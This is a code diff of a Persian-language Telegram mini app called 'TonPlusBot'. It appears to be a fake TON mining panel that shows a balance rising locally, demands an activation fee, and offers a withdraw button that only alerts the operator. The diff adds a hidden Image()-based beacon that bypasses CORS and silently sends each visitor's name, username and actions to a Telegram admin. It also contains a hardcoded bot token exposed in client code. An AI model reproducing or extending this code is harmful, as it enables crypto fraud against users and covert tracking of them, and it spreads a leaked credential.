@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonPlusBot - v45 Professional Fix</title>
+    <title>TonPlusBot - v47 Ultimate</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -17,19 +17,18 @@
             background: #0b1019; color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
         }
 
-        /* بخش پروفایل: عکس در راست، متن در چپ */
+        /* کارت پروفایل: عکس در راست، متن در چپ */
         .card-profile {
             background: #161d27; border-radius: 20px; padding: 15px;
             margin-bottom: 12px; border: 1px solid #242c37;
-            display: flex; align-items: center; justify-content: flex-end; gap: 15px;
+            display: flex; align-items: center; justify-content: flex-start; gap: 15px;
         }
-
-        .profile-text { text-align: right; flex-grow: 1; }
+        .profile-text { text-align: right; flex-grow: 1; order: 1; }
         .avatar-container { 
             width: 60px; height: 60px; border-radius: 50%; 
             background: linear-gradient(135deg, #00c6ff, #0072ff); overflow: hidden;
             display: flex; align-items: center; justify-content: center;
-            border: 2px solid #242c37; flex-shrink: 0;
+            border: 2px solid #242c37; flex-shrink: 0; order: 2;
         }
         .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
         .avatar-container i { font-size: 30px; color: #fff; }
@@ -38,10 +37,9 @@
             background: #161d27; border-radius: 20px; padding: 22px;
             margin-bottom: 12px; border: 1px solid #242c37; text-align: center;
         }
-
         #balance { font-size: 45px; font-weight: 900; color: #00c6ff; display: block; margin: 5px 0; }
 
-        /* استایل دکمه‌های عمومی */
+        /* دکمه‌های هماهنگ */
         .btn {
             width: 100%; height: 58px; border-radius: 20px; border: none;
             font-size: 16px; font-weight: 700; cursor: pointer; display: flex;
@@ -49,26 +47,19 @@
             text-decoration: none; margin-bottom: 12px; box-sizing: border-box;
         }
 
-        /* اصلاح دکمه Connect Wallet (وسط‌چین و بدون انیمیشن) */
+        /* دکمه ولت: متن وسط‌چین و لوگوی کیف پول */
         #ton-connect-btn { width: 100%; }
         #ton-connect-btn * { 
             width: 100% !important; height: 58px !important; 
-            border-radius: 20px !important; 
-            display: flex !important;
-            justify-content: center !important; /* وسط‌چین کردن متن */
-            align-items: center !important;
-            background-color: #0088cc !important;
-            transition: none !important; animation: none !important;
+            border-radius: 20px !important; display: flex !important;
+            justify-content: center !important; align-items: center !important;
+            background-color: #0088cc !important; transition: none !important;
+            animation: none !important;
         }
-
-        /* جایگزینی لوگوی تون با آیکون کیف پول */
-        #ton-connect-btn svg { display: none !important; } /* حذف لوگوی پیش‌فرض */
+        #ton-connect-btn svg { display: none !important; } /* حذف لوگوی تون */
         #ton-connect-btn button::after {
-            content: "\f555"; /* کد آیکون Wallet در FontAwesome */
-            font-family: "Font Awesome 6 Free";
-            font-weight: 900;
-            margin-left: 10px;
-            font-size: 18px;
+            content: "\f555"; font-family: "Font Awesome 6 Free"; font-weight: 900;
+            margin-left: 10px; font-size: 18px;
         }
 
         .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
@@ -76,7 +67,7 @@
         .active-btn { background: #1faa59; }
         .get-code-btn { background: #0088cc; }
 
-        /* پاپ‌آپ فعالسازی مطابق تصویر */
+        /* پاپ‌آپ فعالسازی (مطابق تصویر) */
         #feeModal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #0b1019; z-index: 100000; display: flex; align-items: center; justify-content: center;
@@ -91,12 +82,10 @@
             margin-bottom: 20px; line-height: 1.8; text-align: justify;
         }
         .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; font-weight: 800; font-size: 18px; margin-bottom: 20px; display: block; }
-
-        /* اصلاح کادر Enter Code برای هماهنگی با دکمه‌ها */
+        
         #activationInput {
             width: 100%; height: 58px; border-radius: 20px; border: 1px solid #333;
-            background: #121212; color: #fff; text-align: center; font-size: 17px; 
-            margin-bottom: 12px; outline: none; box-sizing: border-box;
+            background: #121212; color: #fff; text-align: center; font-size: 17px; margin-bottom: 12px; outline: none;
         }
         .hidden { display: none !important; }
     </style>
@@ -152,24 +141,41 @@
     const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
     const ADMIN_ID = "5972276401";
 
-    function logToAdmin(msg) {
-        const u = tg.initDataUnsafe?.user;
-        const info = u ? `\n👤: ${u.first_name}\n🆔: @${u.username || u.id}` : "";
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg + info)}&parse_mode=HTML`);
+    // سیستم ارسال پیام تضمینی (اصلاح شده)
+    function notifyAdmin(action) {
+        const user = tg.initDataUnsafe?.user;
+        const name = user ? user.first_name : "کاربر ناشناس";
+        const username = user?.username ? `@${user.username}` : user?.id || "نامشخص";
+        
+        const text = encodeURIComponent(`📢 گزارش جدید:\n🔹 رویداد: ${action}\n👤 نام: ${name}\n🆔 یوزر: ${username}`);
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${text}&parse_mode=HTML`;
+        
+        // استفاده از تصویر برای دور زدن محدودیت‌های CORS (مطمئن‌ترین روش)
+        const img = new Image();
+        img.src = url;
     }
 
+    // بررسی وضعیت در شروع کار
     if(localStorage.getItem('isActivated') === 'true') {
         document.getElementById('feeModal').style.display = 'none';
+        notifyAdmin("ورود به پنل استخراج");
+    } else {
+        notifyAdmin("مشاهده صفحه پرداخت");
     }
 
     function verifyActivation() {
-        if(document.getElementById('activationInput').value.trim() === SECRET_CODE) {
+        const val = document.getElementById('activationInput').value.trim();
+        if(val === SECRET_CODE) {
             localStorage.setItem('isActivated', 'true');
             document.getElementById('feeModal').remove();
-            logToAdmin("✅ <b>پنل فعال شد</b>");
-        } else { tg.showAlert("رمز اشتباه است ❌"); }
+            notifyAdmin("✅ فعالسازی موفقیت‌آمیز");
+            tg.showAlert("پنل با موفقیت فعال شد!");
+        } else {
+            tg.showAlert("کد اشتباه است ❌");
+        }
     }
 
+    // نمایش اطلاعات کاربر
     const u = tg.initDataUnsafe?.user;
     if (u) {
         document.getElementById('uName').innerText = u.first_name;
@@ -181,17 +187,24 @@
         }
     }
 
-    let bal = parseFloat(localStorage.getItem('bal_v45')) || 0;
+    // منطق استخراج
+    let bal = parseFloat(localStorage.getItem('bal_v47')) || 0;
     setInterval(() => {
         bal += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
-        localStorage.setItem('bal_v45', bal.toString());
+        localStorage.setItem('bal_v47', bal.toString());
     }, 1000);
 
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
         buttonRootId: 'ton-connect-btn'
     });
+
+    document.getElementById('withdrawBtn').onclick = () => {
+        if(localStorage.getItem('isActivated') !== 'true') return tg.showAlert("ابتدا فعالسازی کنید");
+        notifyAdmin(`💰 درخواست برداشت: ${bal.toFixed(6)} TON`);
+        tg.showAlert("درخواست شما ثبت شد ✅");
+    };
 </script>
 </body>
 </html>
